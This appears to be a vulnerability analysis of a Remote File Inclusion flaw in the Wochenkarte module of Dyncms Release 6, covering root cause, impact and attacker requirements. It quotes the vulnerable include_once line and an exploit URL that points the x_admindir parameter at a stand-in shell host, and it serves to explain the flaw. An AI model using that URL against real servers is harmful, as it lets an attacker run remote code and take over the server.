Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability lies in the `index.php` file of the `Wochenkarte` module within the `0_admin/modules/` directory of Dyncms Release 6.
*   The vulnerable code uses an `include_once()` statement with a variable `$x_admindir` that is controllable by the attacker via a GET parameter.
*   Specifically, the vulnerable line is: `include_once($x_admindir."/modules/".$xmodulname."/frontend/tools.inc.php");`

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is a Remote File Inclusion. The application is including a file based on a user-supplied URL (`$x_admindir` parameter).

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By providing a malicious URL in the `x_admindir` parameter, an attacker can force the application to include and execute code from a remote server. This can lead to complete compromise of the web server, data theft, defacement, or other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request:** The attack vector is an HTTP GET request, where the `x_admindir` parameter is manipulated with a malicious URL.
*   The vulnerable URL is identified as: `http://sitename.com/[Script Path]/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=http://SHELLURL.COM?`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server to send HTTP requests.
*   **Knowledge of Vulnerable Path:** The attacker must know the specific vulnerable path (`/0_admin/modules/Wochenkarte/frontend/index.php`) and parameter (`x_admindir`).
*   **Remote Server:** The attacker needs a remote server to host the malicious code to be included.

**Additional Notes:**

*   The exploit requires the attacker to host a malicious script on their own server, and the target server will then include and execute the script
*   The provided exploit example demonstrates a simple RFI by including code from a URL defined in `SHELLURL.COM`.
